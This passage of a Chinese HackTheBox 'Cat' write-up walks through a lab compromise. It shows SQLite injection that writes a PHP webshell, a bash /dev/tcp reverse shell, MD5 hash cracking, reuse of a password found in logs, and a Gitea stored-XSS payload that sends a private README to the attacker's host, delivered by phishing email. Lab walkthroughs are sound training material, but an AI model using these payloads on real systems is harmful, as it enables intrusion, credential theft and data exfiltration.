class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%31</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%31</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%54</span><span class="hljs-variable">%48</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%45</span><span class="hljs-variable">%28</span><span class="hljs-variable">%27</span><span class="hljs-variable">%41</span><span class="hljs-variable">%42</span><span class="hljs-variable">%43</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%55</span><span class="hljs-variable">%50</span><span class="hljs-variable">%50</span><span class="hljs-variable">%45</span><span class="hljs-variable">%52</span><span class="hljs-variable">%28</span><span class="hljs-variable">%48</span><span class="hljs-variable">%45</span><span class="hljs-variable">%58</span><span class="hljs-variable">%28</span><span class="hljs-variable">%52</span><span class="hljs-variable">%41</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%44</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%4</span>d<span class="hljs-variable">%42</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%28</span><span class="hljs-variable">%33</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%61</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%44</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span>--&amp;catId<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可以明显感受到延时变长</p><center>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250719163946141.png" alt="image-20250719163946141" style="zoom:33%;" />    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250719164056131.png" alt="image-20250719164056131" style="zoom:33%;" /></center><p>我们开始尝试写入 webshell</p><p>利用这个 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">ATTACH DATABASE &#x27;/var/www/lol.php&#x27; AS lol;<br>CREATE TABLE lol.pwn (dataz text);<br>INSERT INTO lol.pwn (dataz) VALUES (&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;);--<br></code></pre></td></tr></table></figure><blockquote><p>路径，我们得凭运气和感觉去 fuzz 了，因为项目源码中并没有暴露出绝对路径，这里 fuzz 不到，也就没法了</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">ATTACH DATABASE &#x27;/var/www/cat.htb/lol.php&#x27; AS lol;<br>CREATE TABLE lol.pwn (dataz text);<br>INSERT INTO lol.pwn (dataz) VALUES (&quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;);--<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">catName=111&#x27;);ATTACH DATABASE &#x27;/var/www/cat.htb/lol.php&#x27; AS lol;</span><br><span class="language-xml">CREATE TABLE lol.pwn (dataz text);</span><br><span class="language-xml">INSERT INTO lol.pwn (dataz) VALUES (&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);--&amp;catId=1</span><br></code></pre></td></tr></table></figure><p>url 编码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">catName<span class="hljs-operator">=</span><span class="hljs-number">111</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%41</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%41</span><span class="hljs-variable">%43</span><span class="hljs-variable">%48</span><span class="hljs-variable">%20</span><span class="hljs-variable">%44</span><span class="hljs-variable">%41</span><span class="hljs-variable">%54</span><span class="hljs-variable">%41</span><span class="hljs-variable">%42</span><span class="hljs-variable">%41</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%62</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-variable">%41</span><span class="hljs-variable">%53</span><span class="hljs-variable">%20</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%43</span><span class="hljs-variable">%52</span><span class="hljs-variable">%45</span><span class="hljs-variable">%41</span><span class="hljs-variable">%54</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%54</span><span class="hljs-variable">%41</span><span class="hljs-variable">%42</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%20</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a<span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%52</span><span class="hljs-variable">%54</span><span class="hljs-variable">%20</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%54</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%20</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%56</span><span class="hljs-variable">%41</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%55</span><span class="hljs-variable">%45</span><span class="hljs-variable">%53</span><span class="hljs-variable">%20</span><span class="hljs-variable">%28</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%20</span><span class="hljs-variable">%73</span><span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%47</span><span class="hljs-variable">%45</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>e<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d&amp;catId<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719165120686.png" alt="image-20250719165120686" style="zoom:80%;" /><p>访问 <code>http://cat.htb/lol.php?cmd=whoami</code> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719165219211.png" alt="image-20250719165219211"></p><p>可以反弹 shell 了</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.25/9001 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><p>url 编码的 http 包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/lol.php?cmd=bash+-c+&quot;bash+-i+&gt;%26+/dev/tcp/10.10.14.25/9001+0&gt;%261&quot;</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>cat.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=jno38dja2j93e6ode9sme2a8ap<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br></code></pre></td></tr></table></figure><p>成功弹回了 shell</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719170038100.png" alt="image-20250719170038100"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们在源码中看到了 database 的路径，先来看看数据库吧</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719195524391.png" alt="image-20250719195524391" style="zoom: 50%;" /><p>用 <code>.table</code> 查看表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">www-data@cat:/databases$ sqlite3 cat.db <br>sqlite3 cat.db                                                                   <br>.table                                                                           <br>accepted_cats  cats           users<br></code></pre></td></tr></table></figure><p>查看 users 表</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs coq">select * from users;<br><span class="hljs-number">1</span>|<span class="hljs-type">axel</span>|<span class="hljs-type">axel2017</span>@gmail.com|<span class="hljs-type">d1bbba3670feb9435c9841e46e60ee2f</span><br><span class="hljs-number">2</span>|<span class="hljs-type">rosa</span>|<span class="hljs-type">rosamendoza485</span>@gmail.com|<span class="hljs-type">ac369922d560f17d6eeb8b2c7dec498c</span><br><span class="hljs-number">3</span>|<span class="hljs-type">robert</span>|<span class="hljs-type">robertcervantes2000</span>@gmail.com|<span class="hljs-type">42846631708f69c00ec0c0a8aa4a92ad</span><br><span class="hljs-number">4</span>|<span class="hljs-type">fabian</span>|<span class="hljs-type">fabiancarachure2323</span>@gmail.com|<span class="hljs-type">39e153e825c4a3d314a0dc7f7475ddbe</span><br><span class="hljs-number">5</span>|<span class="hljs-type">jerryson</span>|<span class="hljs-type">jerrysonC343</span>@gmail.com|<span class="hljs-type">781593e060f8d065cd7281c5ec5b4b86</span><br><span class="hljs-number">6</span>|<span class="hljs-type">larry</span>|<span class="hljs-type">larryP5656</span>@gmail.com|<span class="hljs-type">1b6dce240bbfbc0905a664ad199e18f8</span><br><span class="hljs-number">7</span>|<span class="hljs-type">royer</span>|<span class="hljs-type">royer</span>.royer2323@gmail.com|<span class="hljs-type">c598f6b844a36fa7836fba0835f1f6</span><br><span class="hljs-number">8</span>|<span class="hljs-type">peter</span>|<span class="hljs-type">peterCC456</span>@gmail.com|<span class="hljs-type">e41ccefa439fc454f7eadbf1f139ed8a</span><br><span class="hljs-number">9</span>|<span class="hljs-type">angel</span>|<span class="hljs-type">angel234g</span>@gmail.com|<span class="hljs-type">24a8ec003ac2e1b3c5953a6f95f8f565</span><br><span class="hljs-number">10</span>|<span class="hljs-type">jobert</span>|<span class="hljs-type">jobert2020</span>@gmail.com|<span class="hljs-type">88e4dceccd48820cf77b5cf6c08698ad</span><br></code></pre></td></tr></table></figure><p>把他写写道文件中，处理一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/redTeam/htb/cat]<br>└─$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">users</span><br><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br>1|axel|axel2017@gmail.com|d1bbba3670feb9435c9841e46e60ee2f<br>2|rosa|rosamendoza485@gmail.com|ac369922d560f17d6eeb8b2c7dec498c<br>3|robert|robertcervantes2000@gmail.com|42846631708f69c00ec0c0a8aa4a92ad<br>4|fabian|fabiancarachure2323@gmail.com|39e153e825c4a3d314a0dc7f7475ddbe<br>5|jerryson|jerrysonC343@gmail.com|781593e060f8d065cd7281c5ec5b4b86<br>6|larry|larryP5656@gmail.com|1b6dce240bbfbc0905a664ad199e18f8<br>7|royer|royer.royer2323@gmail.com|c598f6b844a36fa7836fba0835f1f6<br>8|peter|peterCC456@gmail.com|e41ccefa439fc454f7eadbf1f139ed8a<br>9|angel|angel234g@gmail.com|24a8ec003ac2e1b3c5953a6f95f8f565<br>10|jobert|jobert2020@gmail.com|88e4dceccd48820cf77b5cf6c08698ad<br>               <br>┌──(kali㉿kali)-[~/redTeam/htb/cat]<br>└─$ <span class="hljs-built_in">cat</span> <span class="hljs-built_in">users</span>| <span class="hljs-built_in">tail</span> -n +2 | awk -F <span class="hljs-string">&#x27;|&#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&quot;:&quot;$4&#125;&#x27;</span> | <span class="hljs-built_in">head</span> -n -1<br>axel:d1bbba3670feb9435c9841e46e60ee2f<br>rosa:ac369922d560f17d6eeb8b2c7dec498c<br>robert:42846631708f69c00ec0c0a8aa4a92ad<br>fabian:39e153e825c4a3d314a0dc7f7475ddbe<br>jerryson:781593e060f8d065cd7281c5ec5b4b86<br>larry:1b6dce240bbfbc0905a664ad199e18f8<br>royer:c598f6b844a36fa7836fba0835f1f6<br>peter:e41ccefa439fc454f7eadbf1f139ed8a<br>angel:24a8ec003ac2e1b3c5953a6f95f8f565<br>jobert:88e4dceccd48820cf77b5cf6c08698ad<br>                                        <br></code></pre></td></tr></table></figure><p>john 破解一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">john  users.hash -w=/usr/share/wordlists/rockyou.txt --format=Raw-MD5<br>Using default input encoding: UTF-8<br>Loaded 9 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])<br>Remaining 8 password hashes with no different salts<br>Warning: no OpenMP support <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=4<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>0g 0:00:00:00 DONE (2025-07-19 08:22) 0g/s 23513Kp/s 23513Kc/s 188109KC/s  fuckyooh21..*7¡Vamos!<br>Session completed. <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">john users.hash --format=Raw-MD5 --show<br>rosa:soyunaprincesarosa<br><br>1 password <span class="hljs-built_in">hash</span> cracked, 8 left<br></code></pre></td></tr></table></figure><p>成功破解了一个 rosa 的密码，我们看一下 home 中有几个用户</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719202547271.png" alt="image-20250719202547271"></p><p>有 rosa，用 ssh 连接看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh rosa@cat.htb <br>rosa@cat.htb<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Last login: Sat Jul 19 11:41:16 2025 from 10.10.16.16</span><br><span class="hljs-string"></span><br><span class="hljs-string">rosa@cat:~$ </span><br></code></pre></td></tr></table></figure><p>成功连上了</p><p>netstat 看到开启了一下本地访问的其他服务</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719203425682.png" alt="image-20250719203425682"></p><p>我们利用 ssh 开一个 socks 代理来访问，当然也能搭建隧道，都是可以的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -D 1080 rosa@cat.htb     <br>rosa@cat.htb<span class="hljs-string">&#x27;s password: </span><br></code></pre></td></tr></table></figure><p>然后用浏览器代理配置 <code>socks5 127.0.0.1:1080</code></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719205112226.png" alt="image-20250719205112226"></p><p>访问 localhost: 3000</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719205235659.png" alt="image-20250719205235659"></p><p>试一下 rosa 的登陆凭证，没有成功</p><p>从日志文件中过滤一下 password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rosa@<span class="hljs-built_in">cat</span>:/var/log$ grep -Ri password .<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">./apache2/access.log.1:127.0.0.1 - - [18/Jul/2025:23:47:16 +0000] &quot;GET /join.php?loginUsername=axel&amp;loginPassword=aNdZwgC4tI9gnVXv_e3Q&amp;loginForm=Login HTTP/1.1&quot; 30<br>2 329 &quot;http://cat.htb/join.php&quot; &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0&quot;<br></code></pre></td></tr></table></figure><p>看到有 axel 的密码 <code>aNdZwgC4tI9gnVXv_e3Q</code>，登陆 web 和 ssh</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719210423054.png" alt="image-20250719210423054"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719210516961.png" alt="image-20250719210516961"></p><p>都成功登陆进来了</p><p>我们可以去看看 axel 的 mail 邮件了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs texy">axel@cat:/var/mail$ cat axel<br>From rosa@cat.htb  Sat Sep 28 04:51:50 2024<br>Return-Path: &lt;rosa@cat.htb&gt;<br>Received: from cat.htb (localhost [127.0.0.1])<br>        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592<br>        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 04:51:50 GMT<br>Received: (from rosa@localhost)<br>        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591<br>        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT<br>Date: Sat, 28 Sep 2024 04:51:49 GMT<br>From: rosa@cat.htb<br>Message-Id: &lt;202409280451.48S4pnlT001591@cat.htb&gt;<br>Subject: New cat services<br><br>Hi Axel,<br><br>We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.<br><br>Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.<br><br>From rosa@cat.htb  Sat Sep 28 05:05:28 2024<br>Return-Path: &lt;rosa@cat.htb&gt;<br>Received: from cat.htb (localhost [127.0.0.1])<br>        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268<br>        for &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 05:05:28 GMT<br>Received: (from rosa@localhost)<br>        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267<br>        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT<br>Date: Sat, 28 Sep 2024 05:05:28 GMT<br>From: rosa@cat.htb<br>Message-Id: &lt;202409280505.48S55Sm0002267@cat.htb&gt;<br>Subject: Employee management<br><br>We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.<br></code></pre></td></tr></table></figure><p><code>Please send an email to jobert@localhost with information about your Gitea repository</code></p><p><code>http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md</code></p><p>我们要给 jobert 发邮件，这里我们肯定是要给他发一封钓鱼邮件。还有信息是要访问 <a href="http://localhost:3000/administrator/Employee-management/">http://localhost:3000/administrator/Employee-management/</a> 这个项目地址。</p><p>在网页的右下角，有版本信息暴露给我们 <code>Gitea 1.22.0</code> </p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719211632410.png" alt="image-20250719211632410"></p><p>这个版本有一个存储型 <a href="https://www.exploit-db.com/exploits/52077">xss</a> 的公开漏洞 </p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719211922034.png" alt="image-20250719211922034" style="zoom:50%;" /><p>创建，在随意添加一个文件，让项目有效</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719212010887.png" alt="image-20250719212010887" style="zoom: 67%;" /><p>点击 XSS test 成功弹窗，漏洞时可用的</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719212147375.png" alt="image-20250719212147375" style="zoom:50%;" /><p>开始邮件钓鱼</p><p>先看能不能把jobert的cookie拿到手</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719212744076.png" alt="image-20250719212744076"></p><p>httponly设为了true，我们没办法用javascript拿到目标cookie了，那就看看网页的内容吧</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req1.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md&#x27;</span>, <span class="hljs-literal">true</span>);<br>req1.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> text = req1.<span class="hljs-property">responseText</span>;<br>    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://10.10.14.25:8000?base64=&#x27;</span> + <span class="hljs-title function_">btoa</span>(text));<br>&#125;;<br>req1.<span class="hljs-title function_">send</span>();<br></code></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;a href=<span class="hljs-string">&quot;javascript:(function()&#123;var req1 = new XMLHttpRequest();req1.open(&#x27;GET&#x27;, &#x27;http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md&#x27;, true);req1.onload = function() &#123;var text = req1.responseText;fetch(&#x27;http://10.10.14.25:8000?base64=&#x27; + btoa(text));&#125;;req1.send();&#125;)();&quot;</span>&gt;<span class="hljs-variable constant_">XSS</span> test&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>点击XSS test 看到是可以发请求的</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719214437092.png" alt="image-20250719214437092" style="zoom:50%;" /><p>向 jobert 发送邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;http://localhost:3000/axel/test&quot;</span> | sendmail jobert@localhost<br></code></pre></td></tr></table></figure><p>接收到了base64</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250719215028391.png" alt="image-20250719215028391"></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># Employee Management</span><br>Site under construction. Authorized <span class="hljs-literal">user</span>: <span class="hljs-literal">admin</span>. No visibility or updates visible to employees.<br><br><span class="hljs-comment"># 员工管理</span><br>网站建设中。授权用户：管理员。员工不可见或更新。<br></code></pre></td></tr></table></figure><p>这个 Readme.md 文件内容没什么用</p><p>我们接着看看网站首页 <code>http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php</code></p><figure 